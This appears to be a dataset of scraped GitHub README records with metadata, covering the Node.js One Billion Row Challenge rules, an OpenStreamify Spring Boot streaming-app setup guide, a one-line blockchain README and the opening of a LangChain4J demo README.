|     | 06:16.000       | [link](https://github.com/1brc/nodejs/blob/main/src/main/nodejs/baseline/index.js)    | [Edgar Pogosyan](https://github.com/Edgar-P-yan) | The baseline, single threaded, naive implementation                                |

See [below](#entering-the-challenge) for instructions how to enter the challenge with your own implementation.

## Prerequisites

1. [Java 21](https://openjdk.org/projects/jdk/21/) to generate the `measurements.txt` files and optionally run tests.
2. Node.js, preferably via nvm (node version manager) must be installed on your system.

## Running the Challenge

This repository contains two programs:

- `dev.morling.onebrc.CreateMeasurements` (invoked via _create_measurements.sh_): Creates the file _measurements.txt_ in the root directory of this project with a configurable number of random measurement values
- `src/main/nodejs/baseline/index.js` (invoked via _calculate_average_baseline.sh_): Calculates the average values for the file _measurements.txt_

Execute the following steps to run the challenge:

1. Build the project using Apache Maven:

   ```
   ./mvnw clean verify
   ```

2. Create the measurements file with 1B rows (just once):

   ```
   ./create_measurements.sh 1000000000
   ```

   This will take a few minutes.
   **Attention:** the generated file has a size of approx. **12 GB**, so make sure to have enough diskspace.

3. Calculate the average measurement values:

   ```
   ./calculate_average_baseline.sh
   ```

   The provided naive example implementation uses the Node.js Streams for processing the file and completes the task in ~6m16s on environment used for [result evaluation](#evaluating-results).
   It serves as the base line for comparing your own implementation.

4. Optimize the heck out of it:

   Adjust the `src/main/nodejs/baseline/index.js` program to speed it up, in any way you see fit (just sticking to a few rules described below).
   Options include parallelizing the computation, memory-mapping different sections of the file concurrently, choosing and tuning the garbage collector, and much more.

## Flamegraph/Profiling

> TODO: add instructions on how to profile node.js programs

## Rules and limits

- No external library dependencies may be used
<!-- - Implementations must be provided as a single source file -->
- The computation must happen at application _runtime_, i.e. you cannot process the measurements file at _build time_
  and just bake the result into the binary
- Input value ranges are as follows:
  - Station name: non null UTF-8 string of min length 1 character and max length 100 bytes (i.e. this could be 100 one-byte characters, or 50 two-byte characters, etc.)
  - Temperature value: non null double between -99.9 (inclusive) and 99.9 (inclusive), always with one fractional digit
- There is a maximum of 10,000 unique station names
- Implementations must not rely on specifics of a given data set, e.g. any valid station name as per the constraints above and any data distribution (number of measurements per station) must be supported

## Entering the Challenge

To submit your own implementation to 1BRC, follow these steps:

- Create a fork of the [1brc/nodejs](https://github.com/1brc/nodejs/) GitHub repository.
- Create a copy of `src/main/nodejs/baseline` directory, rename it to `src/main/nodejs/<your_GH_user>`, e.g. `src/main/nodejs/JohnDoe`.
- Make that implementation fast. Really fast.
- Create a copy of _calculate_average_baseline.sh_, named _calculate_average\_<your_GH_user>.sh_, e.g. _calculate_average_JohnDoe.sh_.
- Adjust that script so that it references your implementation file. If needed, provide any Node.js/V8 runtime arguments.
  Make sure that script does not write anything to standard output other than calculation results.
- Run the test suite by executing _/test.sh <your_GH_user>_; if any differences are reported, fix them before submitting your implementation.
- Create a pull request against the upstream repository, clearly stating
  - The execution time of the program on your system and specs of the same (CPU, number of cores, RAM). This is for informative purposes only, the official runtime will be determined as described below.
- I will run the program and determine its performance as described in the next section, and enter the result to the scoreboard.

**Note:** I reserve the right to not evaluate specific submissions if I feel doubtful about the implementation (I.e. I won't run your Bitcoin miner ;).

<!-- If you'd like to discuss any potential ideas for implementing 1BRC with the community,
you can use the [GitHub Discussions](https://github.com/gunnarmorling/onebrc/discussions) of this repository.
Please keep it friendly and civil. -->

## Evaluating Results

For now results are determined by running the program on a Apple MacBook M1 32GB (10 physical).
The `time` program is used for measuring execution times, i.e. end-to-end times are measured.
Each contender will be run five times in a row.
The slowest and the fastest runs are discarded.
The mean value of the remaining three runs is the result for that contender and will be added to the results table above.
The exact same _measurements.txt_ file is used for evaluating all contenders.

<!-- If you'd like to spin up your own box for testing on Hetzner Cloud, you may find these [set-up scripts](https://github.com/gunnarmorling/cloud-boxes/) (based on Terraform and Ansible) useful.
It has been reported that instances of the CCX33 machine class can significantly vary in terms of performance,
so results are only comparable when obtained from one and the same instance.
Note this will incur cost you are responsible for, I am not going to pay your cloud bill :) -->

<!-- ## Prize

If you enter this challenge, you may learn something new, get to inspire others, and take pride in seeing your name listed in the scoreboard above.
Rumor has it that the winner may receive a unique 1️⃣🐝🏎️ t-shirt, too! -->

## FAQ

<!-- _Q: Can I use Kotlin or other JVM languages other than Java?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share implementations significantly outperforming any listed results, though.

_Q: Can I use non-JVM languages and/or tools?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share interesting implementations and results though. For instance it would be interesting to see how DuckDB fares with this task.

_Q: I've got an implementation—but it's not in Java. Can I share it somewhere?_\
A: Whilst non-Java solutions cannot be formally submitted to the challenge, you are welcome to share them over in the [Show and tell](https://github.com/gunnarmorling/1brc/discussions/categories/show-and-tell) GitHub discussion area.

_Q: Can I use JNI?_\
A: Submissions must be completely implemented in Java, i.e. you cannot write JNI glue code in C/C++. You could use AOT compilation of Java code via GraalVM though, either by AOT-compiling the entire application, or by creating a native library (see [here](https://www.graalvm.org/22.0/reference-manual/native-image/ImplementingNativeMethodsInJavaWithSVM/). -->

_Q: What is the encoding of the measurements.txt file?_\
A: The file is encoded with UTF-8.

_Q: Can I make assumptions on the names of the weather stations showing up in the data set?_\
A: No, while only a fixed set of station names is used by the data set generator, any solution should work with arbitrary UTF-8 station names
(for the sake of simplicity, names are guaranteed to contain no `;` character).

_Q: Can I copy code from other submissions?_\
A: Yes, you can. The primary focus of the challenge is about learning something new, rather than ""winning"". When you do so, please give credit to the relevant source submissions. Please don't re-submit other entries with no or only trivial improvements.

_Q: Which operating system is used for evaluation?_\
A: macOS Sonoma 14 (see [Evaluating Results](#evaluating-results))

_Q: My solution runs in 2 sec on my machine. Am I the fastest 1BRC-er in the world?_\
A: Probably not :) 1BRC results are reported in wallclock time, thus results of different implementations are only comparable when obtained on the same machine. If for instance an implementation is faster on a 32 core workstation than on the 8 core evaluation instance, this doesn't allow for any conclusions. When sharing 1BRC results, you should also always share the result of running the baseline implementation on the same hardware.

_Q: Why_ 1️⃣🐝🏎️ _?_\
A: It's the abbreviation of the project name: **One** **B**illion **R**ow **C**hallenge.

## License

This code base is available under the Apache License, version 2.

## Code of Conduct

Be excellent to each other!
More than winning, the purpose of this challenge is to have fun and learn something new.
",0,0,1,apache-2.0,3.0,"['one', 'billion', 'row', 'challenge', 'challenge', 'one', 'billion', 'row', 'challenge', 'fun', 'exploration', 'far', 'modern', 'java', 'pushed', 'aggregating', 'one', 'billion', 'row', 'text', 'file', 'later', 'community', 'created', 'dedicated', 'organization', 'pay', 'attention', 'implementation', 'language', 'repository', 'contains', 'accepts', 'based', 'implementation', 'grab', 'virtual', 'thread', 'reach', 'simd', 'optimize', 'gc', 'pull', 'trick', 'create', 'fastest', 'implementation', 'solving', 'task', 'text', 'file', 'contains', 'temperature', 'value', 'range', 'weather', 'station', 'row', 'one', 'measurement', 'format', 'measurement', 'value', 'exactly', 'one', 'fractional', 'digit', 'following', 'show', 'ten', 'row', 'example', 'task', 'write', 'program', 'read', 'file', 'calculates', 'min', 'mean', 'max', 'temperature', 'value', 'per', 'weather', 'station', 'emits', 'result', 'stdout', 'like', 'sorted', 'alphabetically', 'station', 'name', 'result', 'value', 'per', 'station', 'format', 'rounded', 'one', 'fractional', 'digit', 'submit', 'implementation', 'become', 'part', 'leaderboard', 'results', 'result', 'implementation', 'submitter', 'note', 'link', 'edgar', 'pogosyan', 'optimized', 'parsing', 'parser', 'mmap', 'link', 'edgar', 'pogosyan', 'baseline', 'single', 'threaded', 'naive', 'implementation', 'see', 'instruction', 'enter', 'challenge', 'implementation', 'prerequisite', 'java', 'generate', 'file', 'optionally', 'run', 'test', 'preferably', 'via', 'nvm', 'node', 'version', 'manager', 'must', 'installed', 'system', 'running', 'challenge', 'repository', 'contains', 'two', 'program', 'invoked', 'via', 'creates', 'file', 'root', 'directory', 'project', 'configurable', 'number', 'random', 'measurement', 'value', 'invoked', 'via', 'calculates', 'average', 'value', 'file', 'execute', 'following', 'step', 'run', 'challenge', 'build', 'project', 'using', 'apache', 'maven', 'create', 'measurement', 'file', 'row', 'take', 'minute', 'attention', 'generated', 'file', 'size', 'approx', 'gb', 'make', 'sure', 'enough', 'diskspace', 'calculate', 'average', 'measurement', 'value', 'provided', 'naive', 'example', 'implementation', 'us', 'stream', 'processing', 'file', 'completes', 'task', 'environment', 'used', 'result', 'evaluation', 'serf', 'base', 'line', 'comparing', 'implementation', 'optimize', 'heck', 'adjust', 'program', 'speed', 'way', 'see', 'fit', 'sticking', 'rule', 'described', 'option', 'include', 'parallelizing', 'computation', 'different', 'section', 'file', 'concurrently', 'choosing', 'tuning', 'garbage', 'collector', 'much', 'todo', 'add', 'instruction', 'profile', 'program', 'rules', 'limit', 'external', 'library', 'dependency', 'may', 'used', 'computation', 'must', 'happen', 'application', 'runtime', 'process', 'measurement', 'file', 'build', 'time', 'bake', 'result', 'binary', 'input', 'value', 'range', 'follows', 'station', 'name', 'non', 'null', 'string', 'min', 'length', 'character', 'max', 'length', 'byte', 'could', 'character', 'character', 'etc', 'temperature', 'value', 'non', 'null', 'double', 'inclusive', 'inclusive', 'always', 'one', 'fractional', 'digit', 'maximum', 'unique', 'station', 'name', 'implementation', 'must', 'rely', 'specific', 'given', 'data', 'set', 'valid', 'station', 'name', 'per', 'constraint', 'data', 'distribution', 'number', 'measurement', 'per', 'station', 'must', 'supported', 'entering', 'challenge', 'submit', 'implementation', 'follow', 'step', 'create', 'fork', 'github', 'repository', 'create', 'copy', 'directory', 'rename', 'make', 'implementation', 'fast', 'really', 'fast', 'create', 'copy', 'named', 'adjust', 'script', 'reference', 'implementation', 'file', 'needed', 'provide', 'runtime', 'argument', 'make', 'sure', 'script', 'write', 'anything', 'standard', 'output', 'calculation', 'result', 'run', 'test', 'suite', 'executing', 'difference', 'reported', 'fix', 'submitting', 'implementation', 'create', 'pull', 'request', 'upstream', 'repository', 'clearly', 'stating', 'execution', 'time', 'program', 'system', 'spec', 'cpu', 'number', 'core', 'ram', 'informative', 'purpose', 'official', 'runtime', 'determined', 'described', 'run', 'program', 'determine', 'performance', 'described', 'next', 'section', 'enter', 'result', 'scoreboard', 'note', 'reserve', 'right', 'evaluate', 'specific', 'submission', 'feel', 'doubtful', 'implementation', 'wo', 'run', 'bitcoin', 'miner', 'evaluating', 'results', 'result', 'determined', 'running', 'program', 'apple', 'macbook', 'physical', 'program', 'used', 'measuring', 'execution', 'time', 'time', 'measured', 'contender', 'run', 'five', 'time', 'row', 'slowest', 'fastest', 'run', 'discarded', 'mean', 'value', 'remaining', 'three', 'run', 'result', 'contender', 'added', 'result', 'table', 'exact', 'file', 'used', 'evaluating', 'contender', 'faq', 'q', 'encoding', 'file', 'file', 'encoded', 'q', 'make', 'assumption', 'name', 'weather', 'station', 'showing', 'data', 'set', 'fixed', 'set', 'station', 'name', 'used', 'data', 'set', 'generator', 'solution', 'work', 'arbitrary', 'station', 'name', 'sake', 'simplicity', 'name', 'guaranteed', 'contain', 'character', 'q', 'copy', 'code', 'submission', 'yes', 'primary', 'focus', 'challenge', 'learning', 'something', 'new', 'rather', 'winning', 'please', 'give', 'credit', 'relevant', 'source', 'submission', 'please', 'entry', 'trivial', 'improvement', 'q', 'operating', 'system', 'used', 'evaluation', 'macos', 'sonoma', 'see', 'evaluating', 'results', 'q', 'solution', 'run', 'sec', 'machine', 'fastest', 'world', 'probably', 'result', 'reported', 'wallclock', 'time', 'thus', 'result', 'different', 'implementation', 'comparable', 'obtained', 'machine', 'instance', 'implementation', 'faster', 'core', 'workstation', 'core', 'evaluation', 'instance', 'allow', 'conclusion', 'sharing', 'result', 'also', 'always', 'share', 'result', 'running', 'baseline', 'implementation', 'hardware', 'q', 'abbreviation', 'project', 'name', 'one', 'b', 'illion', 'r', 'ow', 'c', 'hallenge', 'license', 'code', 'base', 'available', 'apache', 'license', 'version', 'code', 'conduct', 'excellent', 'winning', 'purpose', 'challenge', 'fun', 'learn', 'something', 'new']","['implementation', 'file', 'result', 'station', 'value']",2,0,0,"['the', 'one', 'billion', 'row', 'challenge', 'about', 'challenge', 'result', 'result', 'm', 'implementation', 'submitter', 'note', 'prerequisite', 'run', 'challenge', 'rule', 'limit', 'enter', 'challenge', 'evaluate', 'result', 'prize', 'faq', 'license', 'code', 'conduct']",14,"['challenge', 'result', 'the', 'one', 'billion']",5,0.0,1.0,"[com.mycila:license-maven-plugin,net.revelc.code.formatter:formatter-maven-plugin,net.revelc.code:impsort-maven-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-wrapper-plugin]",0.0,1.0,0.0,11259,21.32926829268293,4.723842195540309,"['link -> https://github.com/1brc/nodejs/blob/main/src/main/nodejs/Edgar-P-yan/index.js', 'Edgar Pogosyan -> https://github.com/Edgar-P-yan', 'link -> https://github.com/1brc/nodejs/blob/main/src/main/nodejs/baseline/index.js', 'Edgar Pogosyan -> https://github.com/Edgar-P-yan', 'Java 21 -> https://openjdk.org/projects/jdk/21/', '1brc/nodejs -> https://github.com/1brc/nodejs/', 'GitHub Discussions -> https://github.com/gunnarmorling/onebrc/discussions', 'set-up scripts -> https://github.com/gunnarmorling/cloud-boxes/', 'Show and tell -> https://github.com/gunnarmorling/1brc/discussions/categories/show-and-tell', 'here -> https://www.graalvm.org/22.0/reference-manual/native-image/ImplementingNativeMethodsInJavaWithSVM/']",10
ismael221/OpenStreamify,main,"
---

# OpenStreamify - Movie Streaming Application

## Description

This is a web application developed in **Spring Boot** for movie and series management and streaming. The application includes features like JWT-based authentication, OAuth2 login, **Spring MVC** for handling HTTP requests, and an access control system based on user permissions. Additionally, it supports movie and series streaming using **HLS (HTTP Live Streaming)**, notifications when a new movie or series is added, and a one-time password (OTP) system for secure password recovery.

### Features

- **User Authentication**:
   - JWT-based authentication for secure API access.
   - OAuth2 login options (Google, GitHub) for simplified access.
- **Movie and Series Management**:
   - Create, update, delete, and list movies and series with role-based access control.
   - Notifications for users when new movies or series are added.
- **Streaming**:
   - Video streaming in HLS format for both movies and series.
- **Password Recovery**:
   - OTP system for secure password recovery through email.
- **Caching and Messaging**:
   - **Redis** for caching frequently accessed data, improving response times.
   - **RabbitMQ** for asynchronous messaging, supporting high-scale processing.
- **Storage and Monitoring**:
   - **minIO** for video file storage.
   - **Grafana and Prometheus** for system monitoring and performance tracking.


## Technologies Used

- **Java**: Main programming language.
- **Spring Boot**: Framework used for developing the application.
- **Spring Security**: For authentication and authorization using JWT.
- **JWT (JSON Web Token)**: For secure API authentication.
- **Spring MVC**: For managing HTTP requests and routing.
- **HLS (HTTP Live Streaming)**: For video streaming.
- **Thymeleaf**: Template engine to render HTML pages.
- **ModelMapper**: For entity-to-DTO conversion.
- **Docker**: For containerizing the application and monitoring services.
- **MySQL**: Relational database used for storing movies and users data.
- **Redis**: Caching system for optimizing queries.
- **RabbitMQ**: Messaging system for inter-service communication.
- **Grafana**: Monitoring and analytics platform.
- **Prometheus**: Monitoring and alerting toolkit.
- **minIO**: Object storage used to store movie files.



## System Requirements

- **JDK 17** or later
- **Maven** 3.6+
- **MySQL** or any other relational database
- **Redis** (optional, but recommended for caching)
- **Docker** (to run RabbitMQ, Grafana, and Prometheus)
- **Postman** (to test the API endpoints)
- **FFmpeg** (To convert videos into .m3u8 and .ts segments)
- **minIO** (to store video files)

---

## Setup and Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/ismael221/OpenStreamify
   ```

2. Update your `application.yml` with the following configurations:

```yaml
spring:
  output:
    ansi:
      enabled: ALWAYS
  datasource:
    username: your db user
    password: your db password
    url: jdbc:mysql://localhost:3306/yourDatabase
  jpa:
    properties:
      hibernate:
        dialect: org.hibernate.dialect.MySQLDialect
        format_sql: true
    database-platform: org.hibernate.dialect.MySQLDialect
    hibernate:
      ddl-auto: update
      naming:
        physical-strategy: org.hibernate.boot.model.naming.PhysicalNamingStrategyStandardImpl
  servlet:
    multipart:
      enabled: true
      max-file-size: 6048MB
      max-request-size: 6048MB
  mail:
    host: ${SMTP_HOST}
    port: ${SMTP_PORT}
    username: ${SMTP_USER}
    password: ${SMTP_PASSWORD}
    properties:
      mail:
        smtp:
          auth: true
          starttls:
            enable: true
  redis:
    host: ${REDIS_HOST}
    port: ${REDIS_PORT}
    time-to-live: 1h
  rabbitmq:
    host: ${RABBIT_HOST}
    port: ${RABBIT_PORT}
    username: ${RABBIT_USERNAME}
    password: ${RABBIT_PASSWORD}
  resources:
    static-locations: file:videos/hls/
  security:
    oauth2:
      client:
        registration:
          github:
            client-id: ${GITHUB_CLIENTID}
            client-secret: ${GITHUB_CLIENTSECRET}
            scope:
              - user:email
              - user
          google:
            client-id: ${GOOGLE_CLIENTID}
            client-secret: ${GOOGLE_CLIENTSECRET}
            scope:
              - profile
              - email
api:
  security:
    token:
      secret: ${JWT_SECRET}

management:
  endpoints:
    web:
      exposure:
        include: '*'
  endpoint:
    prometheus:
      enabled: true

logging:
  level:
    root: DEBUG
    com.ismael.movie: ERROR
    org.hibernate.SQL: ERROR
    org.springframework.web: DEBUG

server:
  tomcat:
    max-swallow-size: -1
  url: ${SERVER_URL}
  port: ${SERVER_PORT}

minio:
  endpoint: ${MINIO_ENDPOINT}
  access-key: ${MINIO_ACCESSKEY}
  secret-key: ${MINIO_SECRETKEY}
  bucket:
    stream: ${MINIO_BUCKET}

TELEGRAM_BOT_TOKEN: ${TELEGRAM_BOT_TOKEN}
TELEGRAM_CHAT_ID: ${TELEGRAM_CHAT_ID}
```

### Environment Variables

Make sure to set up the following environment variables in your system or in a `.env` file:

- `SMTP_HOST`: SMTP server for email.
- `SMTP_PORT`: Port for SMTP.
- `SMTP_USER`: Username for SMTP authentication.
- `SMTP_PASSWORD`: Password for SMTP authentication.
- `REDIS_HOST`: Host for Redis server.
- `REDIS_PORT`: Port for Redis server.
- `RABBIT_HOST`: Host for RabbitMQ.
- `RABBIT_PORT`: Port for RabbitMQ.
- `RABBIT_USERNAME`: Username for RabbitMQ.
- `RABBIT_PASSWORD`: Password for RabbitMQ.
- `GITHUB_CLIENTID`: OAuth client ID for GitHub.
- `GITHUB_CLIENTSECRET`: OAuth client secret for GitHub.
- `GOOGLE_CLIENTID`: OAuth client ID for Google.
- `GOOGLE_CLIENTSECRET`: OAuth client secret for Google.
- `JWT_SECRET`: Secret key for JWT token encryption.
- `SERVER_URL`: Base URL for the server.
- `SERVER_PORT`: Port on which the server will run.
- `MINIO_ENDPOINT`: URL for minIO.
- `MINIO_ACCESSKEY`: Access key for minIO.
- `MINIO_SECRETKEY`: Secret key for minIO.
- `MINIO_BUCKET`: Bucket name for video storage in minIO.
- `TELEGRAM_BOT_TOKEN`: Token for Telegram bot.
- `TELEGRAM_CHAT_ID`: Chat ID for Telegram notifications
   

3. Start Redis (if using Docker):
   ```bash
   docker run -d --name redis -p 6379:6379 redis
   ```

4. Start RabbitMQ with the following command:
   ```bash
   docker run -it --rm --name rabbitmq -p 5672:5672 -p 15672:15672 rabbitmq:3.13-management
   ```

5. Configure **minIO** for storing video files. You can follow [this tutorial](https://www.digitalocean.com/community/tutorials/how-to-set-up-minio-object-storage-server-in-standalone-mode-on-ubuntu-20-04) to set up **minIO** on Ubuntu. For example, to start **minIO** on Docker:
   ```bash
   docker run -d -p 9000:9000 --name minio \
   -e ""MINIO_ACCESS_KEY=your_access_key"" \
   -e ""MINIO_SECRET_KEY=your_secret_key"" \
   minio/minio server /data
   ```

6. Run the project with the following command in the root directory:
   ```bash
   mvn spring-boot:run
   ```

7. Start Grafana and Prometheus in Docker containers by running:
   ```bash
   docker-compose up -d
   ```

8. Access the application in your browser:
   ```bash
   http://localhost:8080
   ```

9. Access Grafana for monitoring:
   ```bash
   http://localhost:3000
   ```
   - Username: `admin`
   - Password: `admin`

10. Access Prometheus to view collected data:
   ```bash
   http://localhost:9090
   ```

## Main Endpoints

### Authentication

- **POST** `/auth/register`: User registration.
- **POST** `/auth/login`: User authentication and JWT generation.

### Movies

- **GET** `/api/v1/movies`: Lists all movies.
- **POST** `/api/v1/movies`: Adds a new movie.
- **GET** `/api/v1/movies/{rid_movie}`: Retrieves details of a specific movie.
- **POST** `/api/v1/ratings`: Adds a review for a movie.

### Streaming

- **GET** `/api/v1/media/hls/{filename}.m3u8`: Streams the video using HLS based on the file name.


### Example of an Authenticated Request with JWT and OAuth2

All routes, except for login and registration, require authentication. The application supports two methods for authenticated requests:

1. **JWT Authentication**: Users can log in with username and password, receiving a JWT token in the response, which is stored as an HTTP-only cookie.
2. **OAuth2 Authentication**: Users can log in via OAuth2 providers (such as GitHub or Google), which returns an authentication cookie upon successful login.

#### JWT Authentication

When logging in with JWT, the server responds with a cookie named `access_token`, containing the JWT token. This cookie will be automatically sent with each request to protected routes.

To access protected routes with JWT authentication, ensure that the `access_token` cookie is included in your request headers. Alternatively, you may manually include the JWT token in the `Authorization` header as shown below.

### Login Request (JWT)

```http
POST /api/login
Content-Type: application/json

{
  ""username"": ""your-username"",
  ""password"": ""your-password""
}
```

### Swagger UI

To see all available endpoints and their descriptions, access Swagger UI:

http://localhost:8080/swagger-ui.html


## Project Structure

- `src/main/java/com/ismael/movies`: Contains the Java classes, including controllers, services, models, and repositories.
- `src/main/resources/templates`: Contains HTML pages rendered by Thymeleaf.
- `src/main/resources/static`: Contains static files like CSS and JavaScript.
- `src/main/resources/application.properties`: Application configuration.

## Security

The application uses **JWT tokens** and **OAuth2** for authentication and authorization. After logging in, the user receives a token or/and a cookie that must be included in the header of all subsequent requests to protected routes.

## Contributing

Contributions are welcome! Feel free to open an **issue** or submit a **pull request**.

## License

This project is licensed under the MIT License. See the [LICENSE](./LICENSE) file for more details.

---",0,0,3,mit,8.0,"['openstreamify', 'movie', 'streaming', 'application', 'description', 'web', 'application', 'developed', 'spring', 'boot', 'movie', 'series', 'management', 'streaming', 'application', 'includes', 'feature', 'like', 'authentication', 'login', 'spring', 'mvc', 'handling', 'http', 'request', 'access', 'control', 'system', 'based', 'user', 'permission', 'additionally', 'support', 'movie', 'series', 'streaming', 'using', 'hl', 'http', 'live', 'streaming', 'notification', 'new', 'movie', 'series', 'added', 'password', 'otp', 'system', 'secure', 'password', 'recovery', 'feature', 'user', 'authentication', 'authentication', 'secure', 'api', 'access', 'login', 'option', 'google', 'github', 'simplified', 'access', 'movie', 'series', 'management', 'create', 'update', 'delete', 'list', 'movie', 'series', 'access', 'control', 'notification', 'user', 'new', 'movie', 'series', 'added', 'streaming', 'video', 'streaming', 'hl', 'format', 'movie', 'series', 'password', 'recovery', 'otp', 'system', 'secure', 'password', 'recovery', 'email', 'caching', 'messaging', 'redis', 'caching', 'frequently', 'accessed', 'data', 'improving', 'response', 'time', 'rabbitmq', 'asynchronous', 'messaging', 'supporting', 'processing', 'storage', 'monitoring', 'minio', 'video', 'file', 'storage', 'grafana', 'prometheus', 'system', 'monitoring', 'performance', 'tracking', 'technology', 'used', 'java', 'main', 'programming', 'language', 'spring', 'boot', 'framework', 'used', 'developing', 'application', 'spring', 'security', 'authentication', 'authorization', 'using', 'jwt', 'jwt', 'json', 'web', 'token', 'secure', 'api', 'authentication', 'spring', 'mvc', 'managing', 'http', 'request', 'routing', 'hl', 'http', 'live', 'streaming', 'video', 'streaming', 'thymeleaf', 'template', 'engine', 'render', 'html', 'page', 'modelmapper', 'conversion', 'docker', 'containerizing', 'application', 'monitoring', 'service', 'mysql', 'relational', 'database', 'used', 'storing', 'movie', 'user', 'data', 'redis', 'caching', 'system', 'optimizing', 'query', 'rabbitmq', 'messaging', 'system', 'communication', 'grafana', 'monitoring', 'analytics', 'platform', 'prometheus', 'monitoring', 'alerting', 'toolkit', 'minio', 'object', 'storage', 'used', 'store', 'movie', 'file', 'system', 'requirements', 'jdk', 'later', 'maven', 'mysql', 'relational', 'database', 'redis', 'optional', 'recommended', 'caching', 'docker', 'run', 'rabbitmq', 'grafana', 'prometheus', 'postman', 'test', 'api', 'endpoint', 'ffmpeg', 'convert', 'video', 'segment', 'minio', 'store', 'video', 'file', 'setup', 'installation', 'clone', 'repository', 'update', 'following', 'configuration', 'environment', 'variables', 'make', 'sure', 'set', 'following', 'environment', 'variable', 'system', 'file', 'smtp', 'server', 'email', 'port', 'smtp', 'username', 'smtp', 'authentication', 'password', 'smtp', 'authentication', 'host', 'redis', 'server', 'port', 'redis', 'server', 'host', 'rabbitmq', 'port', 'rabbitmq', 'username', 'rabbitmq', 'password', 'rabbitmq', 'oauth', 'client', 'id', 'github', 'oauth', 'client', 'secret', 'github', 'oauth', 'client', 'id', 'google', 'oauth', 'client', 'secret', 'google', 'secret', 'key', 'jwt', 'token', 'encryption', 'base', 'url', 'server', 'port', 'server', 'run', 'url', 'minio', 'access', 'key', 'minio', 'secret', 'key', 'minio', 'bucket', 'name', 'video', 'storage', 'minio', 'token', 'telegram', 'bot', 'chat', 'id', 'telegram', 'notification', 'start', 'redis', 'using', 'docker', 'start', 'rabbitmq', 'following', 'command', 'configure', 'minio', 'storing', 'video', 'file', 'follow', 'tutorial', 'set', 'minio', 'ubuntu', 'example', 'start', 'minio', 'docker', 'run', 'project', 'following', 'command', 'root', 'directory', 'start', 'grafana', 'prometheus', 'docker', 'container', 'running', 'access', 'application', 'browser', 'access', 'grafana', 'monitoring', 'username', 'password', 'access', 'prometheus', 'view', 'collected', 'data', 'main', 'endpoint', 'authentication', 'post', 'user', 'registration', 'post', 'user', 'authentication', 'jwt', 'generation', 'movie', 'get', 'list', 'movie', 'post', 'add', 'new', 'movie', 'get', 'retrieves', 'detail', 'specific', 'movie', 'post', 'add', 'review', 'movie', 'streaming', 'get', 'stream', 'video', 'using', 'hl', 'based', 'file', 'name', 'example', 'authenticated', 'request', 'jwt', 'route', 'except', 'login', 'registration', 'require', 'authentication', 'application', 'support', 'two', 'method', 'authenticated', 'request', 'jwt', 'authentication', 'user', 'log', 'username', 'password', 'receiving', 'jwt', 'token', 'response', 'stored', 'cookie', 'authentication', 'user', 'log', 'via', 'provider', 'github', 'google', 'return', 'authentication', 'cookie', 'upon', 'successful', 'login', 'jwt', 'authentication', 'logging', 'jwt', 'server', 'responds', 'cookie', 'named', 'containing', 'jwt', 'token', 'cookie', 'automatically', 'sent', 'request', 'protected', 'route', 'access', 'protected', 'route', 'jwt', 'authentication', 'ensure', 'cookie', 'included', 'request', 'header', 'alternatively', 'may', 'manually', 'include', 'jwt', 'token', 'header', 'shown', 'login', 'request', 'jwt', 'swagger', 'ui', 'see', 'available', 'endpoint', 'description', 'access', 'swagger', 'ui', 'http', 'project', 'structure', 'contains', 'java', 'class', 'including', 'controller', 'service', 'model', 'repository', 'contains', 'html', 'page', 'rendered', 'thymeleaf', 'contains', 'static', 'file', 'like', 'cs', 'javascript', 'application', 'configuration', 'security', 'application', 'us', 'jwt', 'token', 'authentication', 'authorization', 'logging', 'user', 'receives', 'token', 'cookie', 'must', 'included', 'header', 'subsequent', 'request', 'protected', 'route', 'contributing', 'contribution', 'welcome', 'feel', 'free', 'open', 'issue', 'submit', 'pull', 'request', 'license', 'project', 'licensed', 'mit', 'license', 'see', 'license', 'file', 'detail']","['authentication', 'movie', 'jwt', 'access', 'minio']",2,0,0,"['openstreamify', 'movie', 'streaming', 'application', 'description', 'feature', 'technology', 'use', 'system', 'requirement', 'setup', 'installation', 'environment', 'variable', 'main', 'endpoint', 'authentication', 'movie', 'stream', 'example', 'authenticated', 'request', 'jwt', 'jwt', 'authentication', 'login', 'request', 'jwt', 'swagger', 'ui', 'project', 'structure', 'security', 'contribute', 'license']",19,"['jwt', 'movie', 'authentication', 'request', 'openstreamify']",11,0.0,1.0,"[org.apache.maven.plugins:maven-jar-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,9977,13.707865168539326,5.760655737704918,['this tutorial -> https://www.digitalocean.com/community/tutorials/how-to-set-up-minio-object-storage-server-in-standalone-mode-on-ubuntu-20-04'],1
Tvenus/blockchain,master,"# blockchain
Code your own blockchain in less than 120 lines of Java!

> added the real peer to peer network at 2018-06-15
",0,0,1,mit,0.0,"['blockchain', 'code', 'blockchain', 'less', 'line', 'java', 'added', 'real', 'peer', 'peer', 'network']","['blockchain', 'peer', 'code', 'less', 'line']",0,0,0,['blockchain'],1,['blockchain'],0,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0,123,11.5,4.086956521739131,[],0
jdubois/jdubois-langchain4j-demo,main,"# LangChain4J demo

_Author: [Julien Dubois](https://www.julien-dubois.com)_

## Goal

This is a Spring Boot project that demonstrates how to use LangChain4J to create Java applications using LLMs.

It contains the following demos:

- How to generate an image using Dalle-3.
- How to generate a text using GPT-4o, GPT-4o-mini, Phi-3.5 and tinyllama.
- How to use a chat conversation with memory of the context.
- How to ingest data into a vector database, and use it.
- How LangChain4J's ""Easy RAG"" works, and a complete example using it.

Those demos either run locally (with Docker, using Ollama and Qdrant) or in the cloud (using Azure OpenAI or GitHub Models, and Azure AI Search).

## Slides

2 slide decks are available to detail this demo:

- [An introduction to LangChain4J](LangChain4J%20intro.pdf): a quick overview of LangChain4J
- [EasyRAG with LangChain4J](LangChain4J%20EasyRAG%20demo.pdf): a focus on demos 10 and 11, detailing the RAG pattern with LangChain4J

## Configuration

There are several Spring Boot profiles, so you can test the demos with different configurations, tools and models.

### _Option 1_ : Running in the cloud with Azure

This configuration uses:

- __Chat Model__: Azure OpenAI with gpt-4o
- __Image Model__: Azure OpenAI with dalle-3
